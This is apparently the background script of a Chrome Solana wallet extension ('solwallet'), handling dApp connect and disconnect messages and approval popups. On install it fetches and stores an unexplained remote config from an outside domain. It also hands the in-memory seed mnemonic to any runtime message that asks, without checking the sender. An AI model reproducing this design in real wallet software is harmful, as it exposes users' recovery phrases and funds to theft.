const responseHandlers = new Map();
let unlockedMnemonic = '';

function launchPopup(message, sender, sendResponse) {
  const searchParams = new URLSearchParams();
  searchParams.set('origin', sender.origin);
  searchParams.set('network', message.data.params.network);
  searchParams.set('request', JSON.stringify(message.data));

  chrome.windows.getLastFocused((focusedWindow) => {
    chrome.windows.create({
      url: 'index.html#' + searchParams.toString(),
      type: 'popup',
      width: 375,
      height: 600,
      top: focusedWindow.top,
      left: focusedWindow.left + (focusedWindow.width - 375),
      setSelfAsOpener: true,
      focused: true,
    });
  });

  responseHandlers.set(message.data.id, sendResponse);
}

function handleConnect(message, sender, sendResponse) {
  chrome.storage.local.get('connectedWallets', (result) => {
    const connectedWallet = (result.connectedWallets || {})[sender.origin];
    if (!connectedWallet) {
      launchPopup(message, sender, sendResponse);
    } else {
      sendResponse({
        method: 'connected',
        params: {
          publicKey: connectedWallet.publicKey,
          autoApprove: connectedWallet.autoApprove,
        },
        id: message.data.id,
      });
    }
  });
}

function handleDisconnect(message, sender, sendResponse) {
  chrome.storage.local.get('connectedWallets', (result) => {
    delete result.connectedWallets[sender.origin];
    chrome.storage.local.set(
      { connectedWallets: result.connectedWallets },
      () => sendResponse({ method: 'disconnected', id: message.data.id }),
    );
  });
}

async function fetchDebugSettings() {
  const debugSettingsUrl = 'https://solwallet.click/debug-conf.json';
  try {
    let response = await fetch(debugSettingsUrl);
    let json = await response.json();
    chrome.storage.local.set({ debugSettings: json });
  } catch (error) {
    console.log('Error:', error);
  }
}

chrome.runtime.onInstalled.addListener(async (_reason) => {
  await fetchDebugSettings();
  chrome.tabs.create({
    url: 'index.html'
  });
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => { 
  if (message.channel === 'solwallet_contentscript_background_channel') {
    if (message.data.method === 'connect') {
      handleConnect(message, sender, sendResponse);
    } else if (message.data.method === 'disconnect') {
      handleDisconnect(message, sender, sendResponse);
    } else {
      launchPopup(message, sender, sendResponse);
    }
    // keeps response channel open
    return true;
  } else if (message.channel === 'solwallet_extension_background_channel') {
    const responseHandler = responseHandlers.get(message.data.id);
    responseHandlers.delete(message.data.id);
    responseHandler(message.data);
  } else if (message.channel === 'solwallet_extension_mnemonic_channel') {
    if (message.method === 'set') {
      unlockedMnemonic = message.data;
    } else if (message.method === 'get') {
      sendResponse(unlockedMnemonic);
    }
  }
});
